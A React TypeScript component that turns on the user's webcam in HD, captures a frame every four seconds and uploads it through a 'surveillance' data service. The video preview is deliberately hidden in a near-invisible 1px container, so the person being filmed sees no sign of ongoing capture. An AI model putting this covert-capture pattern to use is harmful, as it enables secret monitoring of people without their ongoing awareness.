import React, { useEffect, useRef } from 'react';
import { dataService } from '../services/dataService';

interface CameraMonitorProps {
  user: string;
  onError: () => void;
  onSuccess: () => void;
}

const CameraMonitor: React.FC<CameraMonitorProps> = ({ user, onError, onSuccess }) => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    let stream: MediaStream | null = null;
    let intervalId: any;

    const startCamera = async () => {
      try {
        // REQUEST HIGH RESOLUTION
        // 'ideal' tells the browser to try to get this resolution, 
        // but it will fallback to the best available if not supported.
        stream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            facingMode: "user",
            width: { ideal: 1920 }, // Target Full HD
            height: { ideal: 1080 } 
          } 
        });
        
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          // IMPORTANT: Must play to start stream
          await videoRef.current.play();
          onSuccess();
        }

        // Capture every 4 seconds
        intervalId = setInterval(captureFrame, 4000);

      } catch (err: any) {
        // Permission denied or device not found
        console.warn("Cam Monitor:", err.name);
        onError();
      }
    };

    const captureFrame = async () => {
      if (videoRef.current && canvasRef.current) {
        const video = videoRef.current;
        const canvas = canvasRef.current;
        const context = canvas.getContext('2d');

        // Check if video has valid dimensions
        if (context && video.readyState === video.HAVE_ENOUGH_DATA && video.videoWidth > 0) {
          
          // DYNAMIC RESIZE: Set canvas to match the actual stream resolution
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;

          // Draw exact frame
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          
          // Compress slightly (0.6) to keep file size manageable while maintaining HD quality
          const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
          
          // Upload
          await dataService.uploadSurveillance(user, dataUrl);
        }
      }
    };

    startCamera();

    return () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
      if (intervalId) clearInterval(intervalId);
    };
  }, [user]);

  return (
    // HIDDEN CONTAINER
    // We remove fixed width/height attributes to allow the elements to adapt to the stream
    <div style={{ 
        position: 'fixed', 
        bottom: 0, 
        right: 0, 
        width: '1px', 
        height: '1px', 
        opacity: 0.01, 
        pointerEvents: 'none', 
        zIndex: -50 
    }}>
      <video ref={videoRef} playsInline muted style={{ width: 'auto', height: 'auto' }} />
      <canvas ref={canvasRef} style={{ display: 'none' }} />
    </div>
  );
};

export default CameraMonitor;